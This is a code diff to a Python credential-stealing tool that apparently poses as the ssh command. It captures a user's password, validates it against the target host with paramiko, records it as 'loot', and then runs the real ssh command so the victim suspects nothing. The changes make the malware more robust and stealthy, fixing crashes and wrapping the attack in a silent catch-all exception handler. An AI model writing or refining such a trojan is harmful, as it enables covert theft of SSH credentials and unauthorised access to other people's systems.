@@ -322,7 +322,7 @@ def parseArguments():
     
 def findHostInLootConfigs(lootFileData, host):
     for fileHash in lootFileData["configFiles"]:
-        if host in lootFileData["configFiles"][fileHash]:
+        if lootFileData["configFiles"][fileHash] and host in lootFileData["configFiles"][fileHash]:  #have to check if there is even file data there, otherwise we end up indexing into nothing and failing hard
             return lootFileData["configFiles"][fileHash][host]
     return None
 
@@ -391,7 +391,7 @@ def shinyLetsBeBadGuys():
                 try:
                     password = lowDownDirtyDeceiver(userName, hostAddress)
                 except:
-                    password = FailedToObtain
+                    password = "FailedToObtain"
                     break
                 try:
                     gotValidPass = paramikoApprovesOfThisPassword(hostAddress, hostPort, userName, password)
@@ -402,11 +402,14 @@ def shinyLetsBeBadGuys():
     
 if __name__ == '__main__':
     import os
-    args = parseArguments()
-    intendedCommand = args[:]
-    intendedCommand[0] = originalSSHExecutable
-    intendedCommand = " ".join(intendedCommand)
-    if len(args) > 1:
-        shinyLetsBeBadGuys()
+    try:
+        args = parseArguments()
+        intendedCommand = args[:]
+        intendedCommand[0] = originalSSHExecutable
+        intendedCommand = " ".join(intendedCommand)
+        if len(args) > 1:
+            shinyLetsBeBadGuys()
+    except: #I really feel weird doing a massive open-ended exception here... but silence
+        pass
     os.system(intendedCommand)
     quit()
